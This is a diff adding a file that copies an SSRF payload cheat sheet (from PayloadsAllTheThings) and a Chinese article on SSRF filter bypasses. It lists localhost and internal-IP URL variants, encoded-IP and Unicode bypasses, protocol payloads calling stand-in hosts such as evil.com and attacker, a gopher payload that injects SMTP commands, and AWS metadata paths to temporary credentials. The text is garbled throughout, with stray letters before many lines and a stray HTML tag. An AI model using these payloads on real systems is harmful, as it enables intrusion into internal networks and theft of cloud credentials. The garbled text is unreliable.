@@ -1,0 +1,405 @@
+出自：https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection
+Server-Side Request Forgery
+Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on behalf of him.
+Exploit with localhost
+Basic SSRF v1
+http://127.0.0.1:80
+h
+http://127.0.0.1:443
+h
+http://127.0.0.1:22
+h
+http://0.0.0.0:80
+h
+http://0.0.0.0:443
+h
+http://0.0.0.0:22
+
+
+Basic SSRF v2
+http://localhost:80
+h
+http://localhost:443
+h
+http://localhost:22
+
+
+Advanced exploit using a redirection
+1. Create a subdomain pointing to 192.168.0.1 with DNS A record  e.g:ssrf.example.com
+2
+2. Launch the SSRF: vulnerable.com/index.php?url=http://YOUR_SERVER_IP
+v
+vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
+
+
+Advanced exploit using type=url
+Change "type=file" to "type=url"
+P
+Paste URL in text field and hit enter
+U
+Using this vulnerability users can upload images from any image URL = trigger an SSRF
+
+
+Bypassing filters
+Bypass localhost with [::]
+http://[::]:80/
+h
+http://[::]:25/ SMTP
+h
+http://[::]:22/ SSH
+h
+http://[::]:3128/ Squid
+
+http://0000::1:80/
+h
+http://0000::1:25/ SMTP
+h
+http://0000::1:22/ SSH
+h
+http://0000::1:3128/ Squid
+
+
+Bypass localhost with a domain redirecting to locahost
+http://n-pn.info
+
+
+Bypass localhost with CIDR : 127.x.x.x
+it's a /8
+h
+http://127.127.127.127
+h
+http://127.0.1.3
+h
+http://127.0.0.0
+
+
+Bypass using a decimal ip location
+http://0177.0.0.1/
+h
+http://2130706433/ = http://127.0.0.1
+h
+http://3232235521/ = http://192.168.0.1
+h
+http://3232235777/ = http://192.168.1.1
+
+
+Bypass using malformed urls
+localhost:+11211aaa
+l
+localhost:00011211aaaa
+
+
+Bypass using rare address
+http://0/
+
+
+Bypass using tricks combination
+http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
+u
+urllib2 : 1.1.1.1
+r
+requests + browsers : 2.2.2.2
+u
+urllib : 3.3.3.3
+
+
+Bypass using enclosed alphanumerics @EdOverflow
+http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
+
+
+
+L
+List:
+�
+① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
+
+
+SSRF via URL Scheme
+Dict://
+The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
+dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
+s
+ssrf.php?url=dict://attacker:11111/
+
+
+Sftp://
+ssrf.php?url=sftp://evil.com:11111/
+
+
+Tftp://
+ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
+
+
+Ldap://
+ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
+
+
+Gopher://
+ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
+
+
+
+w
+will make a request like
+H
+HELO localhost
+M
+MAIL FROM:<hacker@site.com>
+R
+RCPT TO:<victim@site.com>
+D
+DATA
+F
+From: [Hacker] <hacker@site.com>
+T
+To: <victime@site.com>
+D
+Date: Tue, 15 Sep 2017 17:20:26 -0400
+S
+Subject: Ah Ah AH
+
+
+
+Y
+You didn't say the magic word !
+
+
+
+
+.
+.
+Q
+QUIT
+
+
+SSRF on AWS Bucket
+Interesting path to look for at http://169.254.169.254
+Always here : /latest/meta-data/{hostname,public-ipv4,...}
+U
+User data (startup script for auto-scaling) : /latest/user-data
+T
+Temporary AWS credentials : /latest/meta-data/iam/security-credentials/
+
+
+DNS record
+http://169.254.169.254
+h
+http://metadata.nicob.net/
+h
+http://169.254.169.254.xip.io/
+h
+http://1ynrnhl.xip.io/
+h
+http://www.owasp.org.1ynrnhl.xip.io/
+
+
+HTTP redirect
+Static:http://nicob.net/redir6a
+D
+Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
+
+
+Alternate IP encoding
+http://425.510.425.510/ Dotted decimal with overflow
+h
+http://2852039166/ Dotless decimal
+h
+http://7147006462/ Dotless decimal with overflow
+h
+http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal
+h
+http://0xA9FEA9FE/ Dotless hexadecimal
+h
+http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
+h
+http://0251.0376.0251.0376/ Dotted octal
+h
+http://0251.00376.000251.0000376/ Dotted octal with padding
+
+
+Thanks to
+Hackerone - How To: Server-Side Request Forgery (SSRF)
+Awesome URL abuse for SSRF by @orange_8361 #BHUSA
+How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! Orange Tsai
+#HITBGSEC 2017 SG Conf D1 - A New Era Of SSRF - Exploiting Url Parsers - Orange Tsai
+SSRF Tips - xl7dev
+SSRF in https://imgur.com/vidgif/url
+Les Server Side Request Forgery : Comment contourner un pare-feu - @Geluchat
+AppSecEU15 Server side browsing considered harmful - @Agarri
+Enclosed alphanumerics - @EdOverflow
+
+
+
+​文章来源：
+https://www.secpulse.com/archives/65832.html
+
+0x01 SSRF能干什么
+
+
+探测内网信息
+
+攻击内网或本地其他服务
+
+穿透防火墙
+
+。。。
+
+0x02 SSRF怎么找
+
+能够对外发起网络请求的地方
+
+请求远程服务器资源的地方
+
+数据库内置功能
+
+邮件系统
+
+文件处理
+
+在线处理工具
+
+。。。
+
+举几个例子：
+
+
+在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。
+
+根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。
+
+数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。
+
+邮件系统就是接收邮件服务器地址这些地方。
+
+文件就找ImageMagick，xml这些。
+
+从URL关键字中寻找，比如：source,share,link,src,imageurl,target等。
+
+以上这些不是本文的重点，下面说下重点介绍的SSRF绕过的方法。
+
+0x03 SSRF怎么绕
+1、攻击本地
+
+1
+2
+http://127.0.0.1:80
+http://localhost:22
+
+
+2、利用[::]
+
+1
+2
+利用[::]绕过localhost
+http://[::]:80/  >>>  http://127.0.0.1
+
+
+也有看到利用http://0000::1:80/的，但是我测试未成功
+
+3、利用@
+1
+http://example.com@127.0.0.1
+
+
+4、利用短地址
+http://dwz.cn/11SMa  >>>  http://127.0.0.1
+5、利用特殊域名
+
+利用的原理是DNS解析
+1
+http://127.0.0.1.xip.io/
+
+
+
+1
+http://www.owasp.org.127.0.0.1.xip.io/
+
+
+
+6、利用DNS解析
+
+在域名上设置A记录，指向127.0.1
+
+
+7、利用上传
+
+也不一定是上传，我也说不清，自己体会 -.-
+修改"type=file"为"type=url"
+比如：
+上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF
+
+
+8、利用Enclosed alphanumerics
+
+利用Enclosed alphanumerics
+ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com
+List:
+① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
+⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
+⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
+⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
+Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ <imgclass="emoji"draggable="false"alt=""src="https://s.w.org/images/core/emoji/72x72/24c2.png"> Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
+ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
+⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
+⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
+
+
+
+9、利用句号
+1
+127。0。0。1  >>>  127.0.0.1
+
+
+
+10、利用进制转换
+
+可以是十六进制，八进制等。
+115.239.210.26  >>>  16373751032
+首先把这四段数字给分别转成16进制，结果：73 ef d2 1a
+然后把 73efd21a 这十六进制一起转换成8进制
+记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x
+
+
+
+1
+http://127.0.0.1  >>>  http://0177.0.0.1/
+
+
+
+1
+http://127.0.0.1  >>>  http://2130706433/
+
+
+
+1
+2
+http://192.168.0.1  >>>  http://3232235521/
+http://192.168.1.1  >>>  http://3232235777/
+
+
+
+11、利用特殊地址
+1
+http://0/
+
+
+
+
+12、利用协议
+
+Dict://
+dict://<user-auth>@<host>:<port>/d:<word>
+ssrf.php?url=dict://attacker:11111/
+SFTP://
+ssrf.php?url=sftp://example.com:11111/
+TFTP://
+ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET
+LDAP://
+ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
+Gopher://
+ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
+
+​
+
+
+
